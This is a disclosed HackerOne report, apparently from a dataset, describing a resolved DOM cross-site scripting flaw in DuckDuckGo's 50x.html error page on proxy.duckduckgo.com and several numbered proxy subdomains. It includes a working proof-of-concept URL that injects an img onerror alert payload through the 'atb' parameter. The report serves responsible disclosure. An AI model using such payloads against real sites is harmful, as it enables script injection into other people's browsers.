---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '426275'
original_report_id: '426275'
title: DOM XSS on 50x.html page on proxy.duckduckgo.com
weakness: Cross-site Scripting (XSS) - DOM
team_handle: duckduckgo
created_at: '2018-10-20T20:41:31.759Z'
disclosed_at: '2018-11-07T15:44:46.150Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 13
asset_identifier: '*.duckduckgo.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-dom
---

# DOM XSS on 50x.html page on proxy.duckduckgo.com

## Metadata

- HackerOne Report ID: 426275
- Weakness: Cross-site Scripting (XSS) - DOM
- Program: duckduckgo
- Disclosed At: 2018-11-07T15:44:46.150Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi,

I read the report about DOM XSS on 50x.html page (https://hackerone.com/reports/405191).
I decided to check some other subdomains to be sure.
This link still executes javascript:
https://proxy.duckduckgo.com/50x.html?e=&atb=test%22/%3E%3Cimg%20src=x%20onerror=alert(%27test%27);%3E

The following subdomains execute javascript as well:
proxy1.duckduckgo.com
proxy2.duckduckgo.com
proxy3.duckduckgo.com
proxy4.duckduckgo.com

@cujanovic: I'm sorry for stealing.

## Impact

The attacker can execute javascript code.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
